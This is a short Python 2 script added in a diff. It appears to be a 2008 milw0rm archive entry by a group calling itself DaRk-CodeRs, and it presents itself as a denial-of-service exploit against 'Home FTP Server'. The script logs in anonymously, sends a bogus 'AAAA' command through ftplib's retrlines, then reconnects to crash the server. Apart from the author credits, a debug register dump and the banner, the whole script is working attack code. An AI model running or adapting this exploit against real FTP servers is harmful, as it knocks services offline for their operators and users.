@@ -1,0 +1,39 @@
+# Discovered by 0in from DaRk-CodeRs Programming & Security Group
+# Contact: 0in(dot)email[at]gmail(dot)com
+# Thats a very funny bug, and nobody understand how it works;]
+# When we send a python FTP retrlines() function bad command and create
+# a new connection server got DoS... o0
+# Thats not overflow, it's probubly in logic application.
+# Greetings to all DaRk-CodeRs Members:
+# Die_Angel, Sun8hclf, M4r1usz, Djlinux, Aristo89
+# Special THX to: Rade0n3900
+# Debug:
+# ----------------------
+# | EIP: 0100FE98 |
+# | DS:[00FFFFED4]=??? |
+# | ECX: 0100FED4 |
+# ----------------------
+from ftplib import FTP
+import time
+ip="127.0.0.1"
+login="anonymous"
+passwd = 'gorion@scriptkiddie.pl'
+print '-------------------------------'
+print '| HOME FTP SERVER DoS Exploit |'
+print '| bY 0in From Dark-Coders! |'
+print '|>>http://dark-coders.4rh.eu<<|'
+print '-------------------------------'
+print 'connecting...'
+ftp=FTP(ip)
+ftp.login(login,passwd)
+print 'sending...'
+try:
+ftp.retrlines("AAAA")
+except Exception:
+print 'ok!\nreconnecting...'
+ftp=FTP(ip)
+ftp.quit()
+print 'DosEd'
+#EoFF
+
+# milw0rm.com [2008-03-17]
